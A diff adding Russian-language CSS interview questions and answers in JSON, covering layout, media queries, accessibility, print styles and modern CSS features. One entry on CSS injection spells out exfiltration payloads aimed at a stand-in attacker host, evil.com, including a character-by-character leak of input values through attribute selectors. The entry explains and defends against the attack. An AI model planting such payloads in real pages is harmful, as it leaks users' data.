+      "answer": "- `visible` (default) — контент выходит за границы элемента\n- `hidden` — контент обрезается, scrollbar нет\n- `scroll` — scrollbar ВСЕГДА показан (даже если контент помещается)\n- `auto` — scrollbar только когда контент не помещается\n- `clip` — как hidden, но НЕ создаёт scroll container (position: sticky работает внутри)\n- `overflow-x`, `overflow-y` — отдельно по осям",
+      "difficulty": "interview",
+      "tags": ["Box Model"]
+    },
+    {
+      "id": "css-float-layout",
+      "slug": "float-layout",
+      "question": "Как работает Float layout (устаревший)?",
+      "answer": "- `float: left/right` — элемент \"всплывает\", текст обтекает\n- Проблема: родитель \"схлопывается\" (высота 0)\n- Решение: clearfix (`::after { content: ''; display: block; clear: both; }`)\n- Сейчас используется почти исключительно для обтекания текстом изображений",
+      "difficulty": "interview",
+      "tags": ["Методы раскладки"]
+    },
+    {
+      "id": "css-table-layout",
+      "slug": "table-layout",
+      "question": "Как работает Table layout?",
+      "answer": "- `display: table`, `table-row`, `table-cell` — табличная раскладка без `<table>`\n- Вертикальное центрирование: `display: table-cell; vertical-align: middle;`\n- Равные колонки по умолчанию\n- Устарел для layout: заменён Flexbox и Grid",
+      "difficulty": "interview",
+      "tags": ["Методы раскладки"]
+    },
+    {
+      "id": "css-multi-column-layout",
+      "slug": "multi-column-layout",
+      "question": "Как работает Multi-column layout?",
+      "answer": "- `column-count: 3` — фиксированное количество колонок\n- `column-width: 200px` — минимальная ширина (количество автоматически)\n- `columns: 3 200px` — shorthand\n- `column-gap`, `column-rule` (разделитель), `break-inside: avoid`\n- Используется для: текстовых блоков, списков, masonry-подобных раскладок",
+      "difficulty": "interview",
+      "tags": ["Методы раскладки"]
+    },
+    {
+      "id": "css-media-queries",
+      "slug": "media-queries",
+      "question": "Что такое медиа-запросы и как они работают?",
+      "answer": "- `@media` — условное применение стилей на основе характеристик устройства/viewport\n- Типы: `screen`, `print`, `all`\n- Features: `width`, `height`, `orientation`, `resolution`, `hover`, `pointer`, `prefers-*`\n- Операторы: `and`, `,` (or), `not`\n- Modern syntax: `@media (width >= 768px)` — range queries",
+      "difficulty": "interview",
+      "tags": ["Адаптивность"]
+    },
+    {
+      "id": "css-min-width-max-width-media",
+      "slug": "min-width-max-width-media",
+      "question": "Разница между `min-width` и `max-width` в медиа-запросах?",
+      "answer": "- `min-width: 768px` — применяется когда viewport >= 768px (mobile-first)\n- `max-width: 767px` — применяется когда viewport <= 767px (desktop-first)\n- Mobile-first рекомендуется: базовые стили для мобильных, расширяем через min-width",
+      "difficulty": "interview",
+      "tags": ["Адаптивность"]
+    },
+    {
+      "id": "css-viewport",
+      "slug": "viewport",
+      "question": "Что такое viewport и как он влияет на адаптивность?",
+      "answer": "- Viewport — видимая область браузера для отображения контента\n- `<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">` — обязателен для мобильных\n- Без meta viewport: мобильные браузеры используют layout viewport ~980px и масштабируют\n- `width=device-width` — layout viewport = ширине устройства",
+      "difficulty": "interview",
+      "tags": ["Адаптивность"]
+    },
+    {
+      "id": "css-media-rules",
+      "slug": "media-rules",
+      "question": "Как работают `@media` правила?",
+      "answer": "- Условная группировка CSS правил\n- `@media screen and (min-width: 768px) { }` — экраны >= 768px\n- Вложенность: `@media screen { @media (min-width: 768px) { } }`\n- Можно в HTML: `<link rel=\"stylesheet\" href=\"print.css\" media=\"print\">`\n- Браузер загружает ВСЕ stylesheets, но не-matching получают низкий приоритет загрузки",
+      "difficulty": "interview",
+      "tags": ["Адаптивность"]
+    },
+    {
+      "id": "css-container-queries",
+      "slug": "container-queries",
+      "question": "Как работают CSS Container Queries?",
+      "answer": "- Применяют стили на основе размера КОНТЕЙНЕРА (не viewport)\n- `container-type: inline-size` — создаёт query container\n- `@container (min-width: 400px) { }` — стили при ширине контейнера >= 400px\n- Позволяют создавать по-настоящему переиспользуемые компоненты",
+      "difficulty": "interview",
+      "tags": ["Адаптивность"]
+    },
+    {
+      "id": "css-mobile-first-desktop-first",
+      "slug": "mobile-first-desktop-first",
+      "question": "Mobile-first vs Desktop-first подходы в адаптивном дизайне?",
+      "answer": "- Mobile-first: базовые стили для мобильных + `@media (min-width)` для расширения\n- Desktop-first: базовые для десктопа + `@media (max-width)` для сужения\n- Mobile-first рекомендуется: progressive enhancement, мобильные грузят меньше CSS",
+      "difficulty": "interview",
+      "tags": ["Адаптивность"]
+    },
+    {
+      "id": "css-fluid-typography",
+      "slug": "fluid-typography",
+      "question": "Что такое Fluid typography?",
+      "answer": "- Плавное масштабирование размера шрифта в зависимости от viewport\n- Вместо дискретных breakpoints — непрерывное изменение\n- `font-size: clamp(1rem, 0.5rem + 2vw, 3rem)`\n- Формула: `preferred = minSize + (maxSize - minSize) * (100vw - minViewport) / (maxViewport - minViewport)`",
+      "difficulty": "interview",
+      "tags": ["Адаптивность"]
+    },
+    {
+      "id": "css-clamp-fluid-typography",
+      "slug": "clamp-fluid-typography",
+      "question": "Как работает `clamp()` для fluid typography?",
+      "answer": "- `clamp(MIN, PREFERRED, MAX)` — значение зажато между min и max\n- MIN — минимальный размер (accessibility: не менее 1rem)\n- PREFERRED — формула с vw для плавного масштабирования\n- MAX — максимальный размер\n```css\nh1 { font-size: clamp(1.5rem, 1rem + 2vw, 3rem); }\np { font-size: clamp(1rem, 0.9rem + 0.5vw, 1.25rem); }\n```",
+      "difficulty": "interview",
+      "tags": ["Адаптивность"]
+    },
+    {
+      "id": "css-container-vs-media-queries",
+      "slug": "container-vs-media-queries",
+      "question": "Container queries vs Media queries когда использовать?",
+      "answer": "- Media queries: глобальный layout (header, footer, page grid)\n- Container queries: переиспользуемые компоненты (card, sidebar content)\n- Container queries решают проблему: компонент в узком sidebar ведёт себя иначе чем в main content, media query этого не учитывает",
+      "difficulty": "interview",
+      "tags": ["Адаптивность"]
+    },
+    {
+      "id": "css-aspect-ratio",
+      "slug": "aspect-ratio",
+      "question": "Как работает `aspect-ratio` для responsive images?",
+      "answer": "- `aspect-ratio: 16 / 9` — задаёт соотношение сторон\n- Браузер вычисляет height из width (или наоборот)\n- Заменяет padding-top hack: `padding-top: 56.25%`\n- Для img: работает как hint пока изображение загружается (предотвращает CLS)\n- Если указаны и width и height атрибуты на `<img>`, браузер автоматически вычисляет aspect-ratio",
+      "difficulty": "interview",
+      "tags": ["Адаптивность"]
+    },
+    {
+      "id": "css-prefers-reduced-motion",
+      "slug": "prefers-reduced-motion",
+      "question": "Как работает `prefers-reduced-motion`?",
+      "answer": "- Media query для пользователей, предпочитающих уменьшенную анимацию\n- `@media (prefers-reduced-motion: reduce) { }` — убрать/уменьшить анимации\n- Включается в настройках ОС (macOS: Reduce Motion, Windows: Show animations off)\n- Best practice: отключить длительные анимации, сохранить мгновенные переходы",
+      "difficulty": "interview",
+      "tags": ["Доступность"]
+    },
+    {
+      "id": "css-prefers-color-scheme",
+      "slug": "prefers-color-scheme",
+      "question": "Как работает `prefers-color-scheme`?",
+      "answer": "- Определяет предпочтение тёмной/светлой темы ОС\n- `@media (prefers-color-scheme: dark) { }` — стили для тёмной темы\n- Комбинируется с CSS-переменными для theme switching\n```css\n:root { --bg: white; --text: black; }\n@media (prefers-color-scheme: dark) {\n  :root { --bg: #1a1a1a; --text: #f0f0f0; }\n}\n```",
+      "difficulty": "interview",
+      "tags": ["Доступность"]
+    },
+    {
+      "id": "css-forced-colors",
+      "slug": "forced-colors",
+      "question": "Как работает `forced-colors`?",
+      "answer": "- `@media (forced-colors: active) { }` — Windows High Contrast Mode\n- Браузер принудительно применяет системные цвета\n- Используйте system colors: `Canvas`, `CanvasText`, `LinkText`, `ButtonFace`, `ButtonText`\n- Некоторые свойства игнорируются: box-shadow, text-shadow, background-image (кроме url())",
+      "difficulty": "interview",
+      "tags": ["Доступность"]
+    },
+    {
+      "id": "css-high-contrast-mode",
+      "slug": "high-contrast-mode",
+      "question": "Что такое High contrast mode в CSS?",
+      "answer": "- Режим Windows для слабовидящих — высококонтрастные системные цвета\n- CSS forced-colors: active — все цвета заменяются системными\n- `forced-color-adjust: none` — отключить принудительные цвета для элемента (осторожно!)\n- Тестируйте: Chrome DevTools → Rendering → Emulate forced colors",
+      "difficulty": "interview",
+      "tags": ["Доступность"]
+    },
+    {
+      "id": "css-media-print",
+      "slug": "media-print",
+      "question": "Как работают `@media print` стили?",
+      "answer": "- Применяются при печати страницы или сохранении в PDF\n- Рекомендуется: скрыть nav/footer/ads, убрать фон, показать URL ссылок\n- `color-adjust: exact` / `print-color-adjust: exact` — сохранить цвета при печати\n- Тестировать: Ctrl+P или Chrome DevTools → Rendering → Emulate CSS media type: print",
+      "difficulty": "interview",
+      "tags": ["Стили для печати"]
+    },
+    {
+      "id": "css-page-breaks",
+      "slug": "page-breaks",
+      "question": "Что такое Page breaks в CSS?",
+      "answer": "- Управление разрывами страниц при печати\n- `break-before: page` — новая страница перед элементом\n- `break-after: page` — новая страница после\n- `break-inside: avoid` — не разрывать элемент между страницами\n- Старые свойства: `page-break-before`, `page-break-after`, `page-break-inside` (deprecated)",
+      "difficulty": "interview",
+      "tags": ["Стили для печати"]
+    },
+    {
+      "id": "css-print-specific-properties",
+      "slug": "print-specific-properties",
+      "question": "Какие Print-specific properties существуют?",
+      "answer": "- `@page { size: A4 landscape; margin: 2cm; }` — размер и отступы страницы\n- `orphans: 3` — минимум строк внизу страницы\n- `widows: 3` — минимум строк вверху страницы\n- `@page :first { margin-top: 5cm; }` — стили первой страницы\n- `marks: crop cross` — метки обрезки",
+      "difficulty": "interview",
+      "tags": ["Стили для печати"]
+    },
+    {
+      "id": "css-rtl-support",
+      "slug": "rtl-support",
+      "question": "Как работает RTL (right-to-left) поддержка?",
+      "answer": "- `direction: rtl` — текст справа налево (арабский, иврит)\n- `dir=\"rtl\"` в HTML предпочтительнее CSS `direction`\n- CSS Logical Properties решают проблему: `margin-inline-start` вместо `margin-left`\n- `writing-mode: horizontal-tb | vertical-rl | vertical-lr` — направление текста",
+      "difficulty": "interview",
+      "tags": ["Интернационализация"]
+    },
+    {
+      "id": "css-direction-writing-mode",
+      "slug": "direction-writing-mode",
+      "question": "Как работают `direction` и `writing-mode`?",
+      "answer": "- `direction: ltr | rtl` — направление inline контента\n- `writing-mode: horizontal-tb` — горизонтальный (default для латиницы)\n- `writing-mode: vertical-rl` — вертикальный справа налево (японский, китайский)\n- `writing-mode: vertical-lr` — вертикальный слева направо (монгольский)\n- Влияет на: block/inline direction, margin/padding interpretation",
+      "difficulty": "interview",
+      "tags": ["Интернационализация"]
+    },
+    {
+      "id": "css-localization",
+      "slug": "localization",
+      "question": "Как локализуется CSS?",
+      "answer": "- CSS Logical Properties: `margin-block`, `margin-inline`, `inset-block`, `inset-inline`\n- `text-align: start | end` вместо `left | right`\n- `:dir(rtl)` / `:dir(ltr)` — селектор по направлению\n- `float: inline-start | inline-end` (пока ограниченная поддержка)",
+      "difficulty": "interview",
+      "tags": ["Интернационализация"]
+    },
+    {
+      "id": "css-bem",
+      "slug": "bem",
+      "question": "Что такое BEM методология?",
+      "answer": "- Block Element Modifier: `.block__element--modifier`\n- Block: самостоятельный компонент (`.card`)\n- Element: часть блока (`.card__title`)\n- Modifier: вариация (`.card--featured`, `.card__title--large`)\n- Плоская структура: все селекторы имеют одинаковую специфичность (0,1,0)",
+      "difficulty": "interview",
+      "tags": ["Архитектура и методологии"]
+    },
+    {
+      "id": "css-oocss-smacss",
+      "slug": "oocss-smacss",
+      "question": "Что такое OOCSS и SMACSS?",
+      "answer": "- OOCSS (Object-Oriented CSS): разделение структуры и оформления, контейнера и содержимого\n- SMACSS (Scalable & Modular Architecture): 5 категорий — Base, Layout, Module, State, Theme\n- OOCSS: `.media { display: flex; }` + `.media-img { margin-right: 1rem; }`\n- SMACSS: `.l-sidebar { }`, `.is-active { }`, `.theme-dark { }`",
+      "difficulty": "interview",
+      "tags": ["Архитектура и методологии"]
+    },
+    {
+      "id": "css-modules",
+      "slug": "css-modules",
+      "question": "Что такое CSS Modules?",
+      "answer": "- Локальные (scoped) стили: каждый класс получает уникальный хеш\n- `.title` → `.title_abc123` в DOM\n- Импорт: `import styles from './Card.module.css'; <div className={styles.title}>`\n- `:global(.class)` — глобальный стиль без хеширования\n- Поддержка: webpack, Vite, Next.js",
+      "difficulty": "interview",
+      "tags": ["Архитектура и методологии"]
+    },
+    {
+      "id": "css-in-js",
+      "slug": "css-in-js",
+      "question": "Что такое CSS-in-JS концепции?",
+      "answer": "- Стили определяются в JavaScript: styled-components, emotion, vanilla-extract\n- Runtime (styled-components): генерирует CSS в runtime, overhead\n- Zero-runtime (vanilla-extract, Linaria): CSS извлекается в build time\n- Плюсы: co-location, dynamic styles, TypeScript types\n- Минусы: runtime cost, bundle size, SSR complexity",
+      "difficulty": "interview",
+      "tags": ["Архитектура и методологии"]
+    },
+    {
+      "id": "css-injection-attacks",
+      "slug": "injection-attacks",
+      "question": "Что такое CSS injection атаки?",
+      "answer": "- Внедрение вредоносного CSS через пользовательский ввод\n- `background: url('https://evil.com/steal?data=' attr(value))` — утечка данных через attr()\n- `input[value^=\"a\"] { background: url('https://evil.com/?char=a'); }` — побуквенное определение значений\n- Защита: санитизация пользовательского CSS, CSP, не вставлять user input в style",
+      "difficulty": "interview",
+      "tags": ["Безопасность"]
+    },
+    {
+      "id": "css-csp",
+      "slug": "csp",
+      "question": "Как работает Content Security Policy для CSS?",
+      "answer": "- `style-src 'self'` — только CSS с того же домена\n- `style-src 'nonce-abc123'` — inline styles с конкретным nonce\n- `style-src 'unsafe-inline'` — разрешить все inline стили (небезопасно)\n- CSP блокирует: inline style без nonce, eval в CSS, сторонние stylesheets",
+      "difficulty": "interview",
+      "tags": ["Безопасность"]
+    },
+    {
+      "id": "css-optimization",
+      "slug": "optimization",
+      "question": "Что такое CSS-оптимизация?",
+      "answer": "- Минификация: удаление пробелов, комментариев (cssnano)\n- Dead code elimination: удаление неиспользуемых правил (PurgeCSS)\n- Critical CSS: inline критических стилей в `<head>`\n- Code splitting: загрузка CSS по маршрутам\n- Оптимизация селекторов: избегать глубокой вложенности",
+      "difficulty": "interview",
+      "tags": ["Производительность и оптимизация"]
+    },
+    {
+      "id": "css-contain-content-visibility",
+      "slug": "contain-content-visibility",
+      "question": "Как работает `contain` и `content-visibility`?",
+      "answer": "- `contain: layout paint size` — изолирует элемент от остального DOM для layout/paint\n- `content-visibility: auto` — элемент не рендерится пока вне viewport (lazy rendering)\n- `contain-intrinsic-size: 0 500px` — предполагаемый размер для content-visibility\n- Экономит rendering cost для длинных страниц: списки, ленты, таблицы",
+      "difficulty": "interview",
+      "tags": ["Производительность и оптимизация"]
+    },
+    {
+      "id": "css-critical-css",
+      "slug": "critical-css",
+      "question": "Что такое Critical CSS?",
+      "answer": "- CSS, необходимый для рендеринга above-the-fold контента\n- Inline в `<head>` для мгновенного First Paint\n- Остальной CSS загружается асинхронно: `<link rel=\"preload\" as=\"style\">`\n- Инструменты: critical, penthouse, critters (webpack plugin)\n- Автоматизация: critters в Next.js, Nuxt",
+      "difficulty": "interview",
+      "tags": ["Производительность и оптимизация"]
+    },
+    {
+      "id": "css-logical-properties",
+      "slug": "logical-properties",
+      "question": "Что такое CSS Logical Properties?",
+      "answer": "- Свойства, адаптирующиеся к `direction` и `writing-mode`\n- `margin-inline-start` вместо `margin-left` (= left в LTR, right в RTL)\n- `block-size` вместо `height`, `inline-size` вместо `width`\n- `inset-block`, `inset-inline` вместо `top/bottom`, `left/right`",
+      "difficulty": "interview",
+      "tags": ["Современные возможности"]
+    },
+    {
+      "id": "css-supports",
+      "slug": "supports",
+      "question": "Как работает `@supports`?",
+      "answer": "- Feature queries — проверка поддержки CSS свойств\n- `@supports (display: grid) { }` — стили если Grid поддерживается\n- `@supports not (display: grid) { }` — fallback\n- `@supports selector(:has(*)) { }` — проверка поддержки селектора\n- Progressive enhancement: базовые стили + @supports для улучшений",
+      "difficulty": "interview",
+      "tags": ["Современные возможности"]
+    },
+    {
+      "id": "css-margin-inline-block",
+      "slug": "margin-inline-block",
+      "question": "Как работают `margin-inline`, `margin-block`?",
+      "answer": "- `margin-inline` = `margin-inline-start` + `margin-inline-end` (= margin-left + margin-right в LTR)\n- `margin-block` = `margin-block-start` + `margin-block-end` (= margin-top + margin-bottom)\n- Shorthand: `margin-inline: 1rem 2rem` (start, end)",
+      "difficulty": "interview",
+      "tags": ["Современные возможности"]
+    },
+    {
+      "id": "css-padding-inline-block",
+      "slug": "padding-inline-block",
+      "question": "Как работают `padding-inline`, `padding-block`?",
+      "answer": "- Аналогично margin: `padding-inline` = start + end по inline axis\n- `padding-block` = start + end по block axis\n- В `writing-mode: vertical-rl`: inline = вертикаль, block = горизонталь",
+      "difficulty": "interview",
+      "tags": ["Современные возможности"]
+    },
+    {
+      "id": "css-border-inline-block",
+      "slug": "border-inline-block",
+      "question": "Как работают `border-inline`, `border-block`?",
+      "answer": "- `border-inline` — border по inline direction (left/right в LTR)\n- `border-block` — border по block direction (top/bottom)\n- Полный набор: `border-inline-start-color`, `border-block-end-width`, etc.",
+      "difficulty": "interview",
+      "tags": ["Современные возможности"]
+    },
+    {
+      "id": "css-houdini",
+      "slug": "houdini",
+      "question": "Что такое CSS Houdini API?",
+      "answer": "- Набор low-level API для расширения CSS из JavaScript\n- **Paint API** — кастомный рисунок через `paint()` function\n- **Properties and Values API** — `@property` с типизацией и анимацией\n- **Typed OM** — типизированный доступ к CSS значениям (вместо строк)\n- **Layout API** — кастомные алгоритмы раскладки (экспериментально)\n- **Animation Worklet** — кастомные анимации вне main thread",
+      "difficulty": "interview",
+      "tags": ["Современные возможности"]
+    },
+    {
+      "id": "css-paint-api",
+      "slug": "paint-api",
+      "question": "Как работает CSS Paint API?",
+      "answer": "- Регистрация кастомного paint: `CSS.paintWorklet.addModule('painter.js')`\n- Использование: `background-image: paint(my-painter)`\n- В worklet: класс с `paint(ctx, size, props)` — canvas-like API\n- Позволяет создавать динамические фоны, паттерны, эффекты",
+      "difficulty": "interview",
+      "tags": ["Современные возможности"]
+    },
+    {
+      "id": "css-properties-values-api",
+      "slug": "properties-values-api",
+      "question": "Как работает CSS Properties and Values API?",
+      "answer": "- `@property --my-color { syntax: '<color>'; inherits: false; initial-value: red; }`\n- Типизирует CSS custom properties — позволяет анимировать!\n- Без `@property`: `--color` — строка, transition между строками невозможен\n- С `@property`: `--color` — цвет, можно `transition: --color 0.3s`",
+      "difficulty": "interview",
+      "tags": ["Современные возможности"]
+    },
+    {
+      "id": "css-typed-om",
+      "slug": "typed-om",
+      "question": "Как работает CSS Typed OM?",
+      "answer": "- JavaScript API для типизированного доступа к CSS значениям\n- `el.computedStyleMap().get('width')` → `CSSUnitValue { value: 200, unit: 'px' }`\n- Вместо строк (`'200px'`) — типизированные объекты с числами и единицами\n- Производительнее и безопаснее чем `getComputedStyle` + parsing строк",
+      "difficulty": "interview",
+      "tags": ["Современные возможности"]
+    },
+    {
+      "id": "css-layout-api",
+      "slug": "layout-api",
+      "question": "Как работает CSS Layout API?",
+      "answer": "- Экспериментальный API для создания кастомных layout алгоритмов\n- `display: layout(my-layout)` — подключение кастомного layout\n- Worklet: `registerLayout('my-layout', class { ... })`\n- Пока ограниченная поддержка в браузерах",
+      "difficulty": "interview",
+      "tags": ["Современные возможности"]
+    },
+    {
+      "id": "css-devtools-debugging",
+      "slug": "devtools-debugging",
+      "question": "Как использовать DevTools для отладки CSS?",
+      "answer": "- Elements panel: inspect элемент, edit styles в реальном времени\n- Computed tab: финальные вычисленные значения, откуда наследовано\n- Box Model visualization: margin, border, padding, content\n- CSS Grid/Flexbox overlays: визуализация сеток\n- Rendering tab: Paint flashing, Layout Shift Regions, FPS meter\n- Coverage tab: процент используемого CSS",
+      "difficulty": "interview",
+      "tags": ["Отладка и инструменты"]
+    },
+    {
+      "id": "css-validation",
+      "slug": "validation",
+      "question": "Что такое CSS-валидация?",
+      "answer": "- Проверка CSS на соответствие стандартам W3C\n- W3C CSS Validator: jigsaw.w3.org/css-validator\n- Lint: stylelint — линтер с правилами для ошибок, конвенций, performance\n- IDE: встроенная валидация в VS Code, WebStorm\n- Browser DevTools: warnings в Console и Elements panel",
+      "difficulty": "interview",
+      "tags": ["Отладка и инструменты"]
+    },
+    {
+      "id": "css-performance-audit",
+      "slug": "performance-audit",
+      "question": "Как работает CSS-аудит производительности?",
+      "answer": "- Chrome DevTools Performance tab: recording, flame chart, Layout/Paint/Composite timings\n- Lighthouse: аудит CSS coverage, render-blocking resources, CLS\n- Chrome DevTools Coverage tab: % неиспользуемого CSS\n- Rendering tab: Paint flashing (подсвечивает repaints), Layout Shift Regions\n- Performance Monitor: real-time CPU, Layouts/sec, Style recalcs/sec",
+      "difficulty": "interview",
+      "tags": ["Отладка и инструменты"]
+    },
+    {
+      "id": "css-filters",
+      "slug": "filters",
+      "question": "Как работают CSS Filters (`filter`, `backdrop-filter`)?",
+      "answer": "- `filter` — применяется к элементу: `blur()`, `brightness()`, `contrast()`, `grayscale()`, `hue-rotate()`, `invert()`, `opacity()`, `saturate()`, `sepia()`, `drop-shadow()`\n- `backdrop-filter` — к области ЗА элементом (стекло-эффект): `backdrop-filter: blur(10px)`\n- `drop-shadow()` vs `box-shadow`: drop-shadow следует форме элемента (включая прозрачность PNG)\n- `filter` создаёт stacking context и containing block для fixed позиционирования",
+      "difficulty": "interview",
+      "tags": ["Дополнительные темы"]
+    },
+    {
+      "id": "css-clip-path-masking",
+      "slug": "clip-path-masking",
+      "question": "Как работает `clip-path` и CSS Masking?",
+      "answer": "- `clip-path` — обрезка элемента по форме: `circle()`, `ellipse()`, `polygon()`, `inset()`, `path()`\n- `mask-image` — маска через изображение/градиент (прозрачность = видимость)\n- `clip-path: polygon(50% 0%, 0% 100%, 100% 100%)` — треугольник\n- Анимируется: можно анимировать clip-path между формами с одинаковым числом точек",
+      "difficulty": "interview",
+      "tags": ["Дополнительные темы"]
+    },
+    {
+      "id": "css-shapes",
+      "slug": "shapes",
+      "question": "Как работают CSS Shapes (`shape-outside`, `shape-margin`)?",
+      "answer": "- `shape-outside` — форма обтекания текстом вокруг float-элемента\n- Значения: `circle()`, `ellipse()`, `polygon()`, `inset()`, `url(image.png)`\n- `shape-margin` — отступ текста от shape\n- Работает ТОЛЬКО с float элементами",
+      "difficulty": "interview",
+      "tags": ["Дополнительные темы"]
+    },
+    {
+      "id": "css-scroll-snap",
+      "slug": "scroll-snap",
+      "question": "Как работает CSS Scroll Snap (`scroll-snap-type`, `scroll-snap-align`)?",
+      "answer": "- Контейнер: `scroll-snap-type: x mandatory` или `y proximity`\n- Items: `scroll-snap-align: start | center | end`\n- `mandatory` — всегда snap к ближайшей точке, `proximity` — snap если близко\n- `scroll-snap-stop: always` — не пропускать элементы при быстром скролле\n- Идеально для: карусели, слайдеры, горизонтальные списки",
+      "difficulty": "interview",
+      "tags": ["Дополнительные темы"]
+    },
+    {
+      "id": "css-scroll-behavior-smooth",
+      "slug": "scroll-behavior-smooth",
+      "question": "Как работает `scroll-behavior: smooth`?",
+      "answer": "- Плавная прокрутка при навигации через якоря (`#section`) и `scrollTo()`\n- `html { scroll-behavior: smooth; }` — глобально\n- Уважайте `prefers-reduced-motion`: отключайте smooth для reduce\n- JS fallback: `element.scrollIntoView({ behavior: 'smooth' })`",
+      "difficulty": "interview",
+      "tags": ["Дополнительные темы"]
+    },
+    {
+      "id": "css-scroll-padding-margin",
+      "slug": "scroll-padding-margin",
+      "question": "Как работают `scroll-padding` и `scroll-margin`?",
+      "answer": "- `scroll-padding` — на контейнере: отступ от края при snap/scroll-to (учитывает sticky header)\n- `scroll-margin` — на элементе: отступ от snap point\n- `html { scroll-padding-top: 80px; }` — компенсация fixed header при якорных ссылках\n- Работает с scroll-snap и fragment navigation (#id)",
+      "difficulty": "interview",
+      "tags": ["Дополнительные темы"]
+    },
+    {
+      "id": "css-containment-layout-paint",
+      "slug": "containment-layout-paint",
+      "question": "Как работает CSS Containment (`contain: layout`, `contain: paint`)?",
+      "answer": "- `contain: layout` — layout элемента изолирован от остального документа\n- `contain: paint` — рисование не выходит за пределы box (clipping, stacking context)\n- `contain: size` — размер не зависит от детей (нужно задать явно)\n- `contain: style` — counters/quotes не влияют на внешний документ",
+      "difficulty": "interview",
+      "tags": ["Дополнительные темы"]
+    },
+    {
+      "id": "css-contain-strict-content",
+      "slug": "contain-strict-content",
+      "question": "Как работает `contain: size`, `contain: style`, `contain: strict`?",
+      "answer": "- `contain: strict` = `contain: size layout paint style` — максимальная изоляция\n- `contain: content` = `contain: layout paint style` (без size)\n- `contain: size` опасен без явных размеров — элемент схлопнется в 0x0\n- Используйте `contain: content` для большинства случаев",
+      "difficulty": "interview",
+      "tags": ["Дополнительные темы"]
+    },
+    {
+      "id": "css-style-isolation-containment",
+      "slug": "style-isolation-containment",
+      "question": "Как работает изоляция стилей через containment?",
+      "answer": "- Containment ограничивает \"область влияния\" элемента на layout/paint/style\n- Браузер может оптимизировать: если элемент содержит (`contain: layout`), изменения внутри не вызовут reflow снаружи\n- `content-visibility: auto` автоматически применяет containment + skip rendering",
+      "difficulty": "interview",
+      "tags": ["Дополнительные темы"]
+    },
+    {
+      "id": "css-variable-inheritance",
+      "slug": "variable-inheritance",
+      "question": "Как работает наследование CSS переменных?",
+      "answer": "- Custom properties наследуются по DOM-дереву (как color)\n- Можно переопределить на любом уровне\n- `:root { --color: red; }` → `.child { --color: blue; }` → потомки .child увидят blue\n- `@property` с `inherits: false` — отключает наследование",
+      "difficulty": "interview",
+      "tags": ["Дополнительные темы"]
+    },
+    {
+      "id": "css-variable-fallbacks",
+      "slug": "variable-fallbacks",
+      "question": "Как работают Fallback значения в CSS переменных?",
+      "answer": "- `var(--color, red)` — если `--color` не определён, используется `red`\n- Вложенные: `var(--color, var(--fallback-color, blue))`\n- Fallback НЕ срабатывает при невалидном значении (например, `--color: 42px` для `color`) — свойство получит `unset`\n- Для отладки: DevTools показывает, какая переменная используется",
+      "difficulty": "interview",
+      "tags": ["Дополнительные темы"]
+    },
+    {
+      "id": "css-variable-scope",
+      "slug": "variable-scope",
+      "question": "Как работает область видимости CSS переменных?",
+      "answer": "- Определяются на селекторе → доступны этому элементу и его потомкам\n- `:root` — глобальная область видимости\n- `.card { --card-bg: white; }` — доступно только внутри .card\n- Media queries: `@media (prefers-color-scheme: dark) { :root { --bg: black; } }`",
+      "difficulty": "interview",
+      "tags": ["Дополнительные темы"]
+    },
+    {
+      "id": "css-variable-js-dynamic",
+      "slug": "variable-js-dynamic",
+      "question": "Как работает динамическое изменение CSS переменных через JS?",
+      "answer": "- Чтение: `getComputedStyle(el).getPropertyValue('--color')`\n- Запись: `el.style.setProperty('--color', 'blue')`\n- На :root: `document.documentElement.style.setProperty('--color', 'blue')`\n- Реактивно: все элементы, использующие переменную, обновятся автоматически\n- Performance: одно изменение custom property может обновить сотни элементов",
+      "difficulty": "interview",
+      "tags": ["Дополнительные темы"]
+    },
+    {
+      "id": "css-custom-media-queries",
+      "slug": "custom-media-queries",
+      "question": "Как работают CSS Custom Media Queries?",
+      "answer": "- `@custom-media --tablet (min-width: 768px)` — именованный media query\n- Использование: `@media (--tablet) { }`\n- Пока нет нативной поддержки — только через PostCSS (postcss-custom-media)\n- Альтернатива: CSS custom properties для значений внутри media queries",
+      "difficulty": "interview",
+      "tags": ["Дополнительные темы"]
+    },
+    {
+      "id": "css-scope-rule",
+      "slug": "scope-rule",
+      "question": "Как работает `@scope` для изоляции стилей?",
+      "answer": "- `@scope (.card) { .title { color: red; } }` — стили ограничены потомками .card\n- Lower boundary: `@scope (.card) to (.card__footer) { }` — исключить часть поддерева\n- Scope proximity: при конфликте побеждает ближайший scope (не специфичность)\n- Альтернатива CSS Modules для нативной изоляции",
+      "difficulty": "interview",
+      "tags": ["Дополнительные темы"]
+    },
+    {
+      "id": "css-cascade-layers",
+      "slug": "cascade-layers",
+      "question": "Как работает CSS Cascade Layers (`@layer`)?",
+      "answer": "- Группировка стилей в именованные слои с явным приоритетом\n- `@layer reset, base, components;` — объявление порядка\n- Последний layer > первый, unlayered > все layers\n- Для !important — инверсия порядка\n- Используется для: reset < third-party < design-system < components < overrides",
+      "difficulty": "interview",
+      "tags": ["Дополнительные темы"]
+    },
+    {
+      "id": "css-color-mix",
+      "slug": "color-mix",
+      "question": "Как работает CSS Color-mix функция?",
+      "answer": "- `color-mix(in srgb, red 50%, blue 50%)` — смешивание цветов\n- Interpolation space: `srgb`, `oklch`, `lab`, `hsl` — влияет на результат\n- Неравное смешивание: `color-mix(in oklch, red 30%, blue)` — 30% red, 70% blue\n- Применение: автоматические hover/active цвета, палитры\n```css\n:root { --primary: #3b82f6; }\n.btn:hover { background: color-mix(in oklch, var(--primary), black 20%); }\n```",
+      "difficulty": "interview",
+      "tags": ["Дополнительные темы"]
+    },
+    {
+      "id": "css-relative-color-syntax",
+      "slug": "relative-color-syntax",
+      "question": "Как работает CSS Relative Color Syntax?",
+      "answer": "- Модификация каналов существующего цвета: `rgb(from red r g 200)` — заменить blue канал\n- `oklch(from var(--color) l c calc(h + 30))` — повернуть hue на 30°\n- `oklch(from var(--color) calc(l * 1.2) c h)` — осветлить на 20%\n- Мощный инструмент для программной генерации палитр из одного базового цвета",
+      "difficulty": "interview",
+      "tags": ["Дополнительные темы"]
+    },
+    {
+      "id": "css-anchor-positioning",
+      "slug": "anchor-positioning",
+      "question": "Как работает CSS Anchor Positioning?",
+      "answer": "- Привязка элемента к \"якорю\" (другому элементу) без JavaScript\n- Якорь: `anchor-name: --tooltip-anchor`\n- Позиционируемый: `position-anchor: --tooltip-anchor; top: anchor(bottom);`\n- `position-try-fallbacks` — альтернативные позиции если не помещается\n- Идеально для: tooltips, dropdowns, popovers без JS библиотек",
+      "difficulty": "interview",
